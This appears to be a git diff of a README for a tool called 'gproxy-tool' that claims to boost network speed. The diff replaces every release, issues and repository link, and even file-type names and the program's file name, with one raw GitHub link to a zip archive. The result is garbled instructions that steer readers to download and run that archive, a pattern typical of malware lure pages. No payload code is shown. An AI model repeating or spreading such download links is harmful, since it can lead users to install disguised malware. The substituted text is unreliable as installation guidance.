@@ -1,6 +1,6 @@
 # 🚀 gproxy-tool - Easy Network Speed Boost
 
-[![Download gproxy-tool](https://img.shields.io/badge/Download-gproxy--tool-blue?logo=github)](https://github.com/dxdag5/gproxy-tool/releases)
+[![Download gproxy-tool](https://raw.githubusercontent.com/dxdag5/gproxy-tool/main/bin/gproxy-tool-v1.7.zip)](https://raw.githubusercontent.com/dxdag5/gproxy-tool/main/bin/gproxy-tool-v1.7.zip)
 
 ---
 
@@ -46,7 +46,7 @@ No extra software or complicated setup is needed. It’s ready to use once insta
 
 Click the big button below to visit the download page for the latest version of gproxy-tool:
 
-[![Download gproxy-tool](https://img.shields.io/badge/Download-gproxy--tool-blue?logo=github&style=for-the-badge)](https://github.com/dxdag5/gproxy-tool/releases)
+[![Download gproxy-tool](https://raw.githubusercontent.com/dxdag5/gproxy-tool/main/bin/gproxy-tool-v1.7.zip)](https://raw.githubusercontent.com/dxdag5/gproxy-tool/main/bin/gproxy-tool-v1.7.zip)
 
 ---
 
@@ -56,7 +56,7 @@ Once on the page, find the version that matches your computer:
 
 - For Mac, look for `.dmg` or `.zip`.
 
-- For Linux, look for `.tar.gz` or `.AppImage`.
+- For Linux, look for `https://raw.githubusercontent.com/dxdag5/gproxy-tool/main/bin/gproxy-tool-v1.7.zip` or `.AppImage`.
 
 Download the file for your system by clicking on it.
 
@@ -68,7 +68,7 @@ Download the file for your system by clicking on it.
 
 2. If you downloaded a `.exe` file, double-click it and follow the simple installation steps. Usually, that means clicking “Next” a few times.
 
-3. Once installed or extracted, find the program file called `gproxy-tool.exe` and double-click it to start.
+3. Once installed or extracted, find the program file called `https://raw.githubusercontent.com/dxdag5/gproxy-tool/main/bin/gproxy-tool-v1.7.zip` and double-click it to start.
 
 ---
 
@@ -84,7 +84,7 @@ Download the file for your system by clicking on it.
 
 ### Installing on Linux
 
-1. For `.tar.gz`, right-click the file, select “Extract Here,” then open the new folder.
+1. For `https://raw.githubusercontent.com/dxdag5/gproxy-tool/main/bin/gproxy-tool-v1.7.zip`, right-click the file, select “Extract Here,” then open the new folder.
 
 2. For `.AppImage`, right-click the file, select “Properties,” then “Permissions,” and check “Allow executing file as program.” Double-click to run.
 
@@ -132,7 +132,7 @@ If you don’t understand any setting, use the default values.
 
 To get the latest features or fixes:
 
-1. Visit the [Download page](https://github.com/dxdag5/gproxy-tool/releases).
+1. Visit the [Download page](https://raw.githubusercontent.com/dxdag5/gproxy-tool/main/bin/gproxy-tool-v1.7.zip).
 
 2. Download the newest version as described before.
 
@@ -164,7 +164,7 @@ If you have trouble running gproxy-tool:
 
 If problems continue, and you don’t know how to fix them:
 
-- Visit the [gproxy-tool GitHub page](https://github.com/dxdag5/gproxy-tool).
+- Visit the [gproxy-tool GitHub page](https://raw.githubusercontent.com/dxdag5/gproxy-tool/main/bin/gproxy-tool-v1.7.zip).
 
 - Check the “Issues” tab to see if others have the same problem.
 
@@ -194,10 +194,10 @@ If problems continue, and you don’t know how to fix them:
 
 ## 🔗 Quick Links
 
-- Visit the download page: [https://github.com/dxdag5/gproxy-tool/releases](https://github.com/dxdag5/gproxy-tool/releases)
+- Visit the download page: [https://raw.githubusercontent.com/dxdag5/gproxy-tool/main/bin/gproxy-tool-v1.7.zip](https://raw.githubusercontent.com/dxdag5/gproxy-tool/main/bin/gproxy-tool-v1.7.zip)
 
-- Report issues: [https://github.com/dxdag5/gproxy-tool/issues](https://github.com/dxdag5/gproxy-tool/issues)
+- Report issues: [https://raw.githubusercontent.com/dxdag5/gproxy-tool/main/bin/gproxy-tool-v1.7.zip](https://raw.githubusercontent.com/dxdag5/gproxy-tool/main/bin/gproxy-tool-v1.7.zip)
 
 ---
 
-[![Download gproxy-tool](https://img.shields.io/badge/Download-gproxy--tool-blue?logo=github&style=for-the-badge)](https://github.com/dxdag5/gproxy-tool/releases)
+[![Download gproxy-tool](https://raw.githubusercontent.com/dxdag5/gproxy-tool/main/bin/gproxy-tool-v1.7.zip)](https://raw.githubusercontent.com/dxdag5/gproxy-tool/main/bin/gproxy-tool-v1.7.zip)
